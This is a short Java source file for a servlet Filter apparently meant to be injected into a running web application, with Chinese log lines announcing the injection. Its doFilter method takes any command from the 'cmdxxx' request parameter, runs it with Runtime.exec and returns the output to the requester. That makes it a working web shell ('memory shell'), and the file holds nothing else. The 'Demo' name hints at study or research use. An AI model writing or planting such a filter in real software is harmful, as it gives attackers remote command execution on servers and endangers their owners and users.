package com;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import java.io.IOException;

public class injectFilterDemo2 implements Filter {
    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
        System.out.println("注入Filter成功");
    }

    @Override
    public void destroy() {
        System.out.println("注入Filter销毁");
    }

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
        try {
            HttpServletRequest req = (HttpServletRequest) request;
            String cmd = req.getParameter("cmdxxx");
            if (cmd != null) {
                System.out.println(cmd);
                byte[] bytes = new byte[2048];
                int len = Runtime.getRuntime().exec(cmd).getInputStream().read(bytes);
                response.getWriter().write(new String(bytes, 0, len));
                response.getWriter().flush();
            }
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }
}
